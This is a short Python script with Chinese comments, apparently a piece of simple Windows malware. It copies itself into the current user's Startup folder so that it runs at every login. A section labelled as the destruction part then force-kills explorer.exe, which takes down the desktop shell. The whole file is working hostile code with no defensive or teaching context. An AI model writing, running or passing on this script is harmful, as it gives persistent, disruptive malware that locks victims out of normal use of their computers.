import os
import shutil
import sys
import subprocess

# 文件拷贝部分

# 获取用户的启动文件夹路径
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# 获取当前脚本的文件名
script_name = os.path.basename(sys.argv[0])

# 检查启动文件夹中是否已有本文件
def is_file_in_startup_folder(startup_folder, file_name):
    return file_name in os.listdir(startup_folder)

# 复制脚本到启动文件夹
def copy_self_to_startup(startup_folder, script_path, script_name):
    destination_path = os.path.join(startup_folder, script_name)
    shutil.copyfile(script_path, destination_path)
    print(f"Copied {script_name} to {destination_path}")

# 获取当前脚本的路径
script_path = os.path.realpath(sys.argv[0])

# 检查是否已有同名文件在启动文件夹中
if is_file_in_startup_folder(startup_folder, script_name):
    pass
else:
    copy_self_to_startup(startup_folder, script_path, script_name)
    
# 破坏部分

# 杀死文件资源管理器进程
subprocess.run(['taskkill','/im','explorer.exe','/f'])
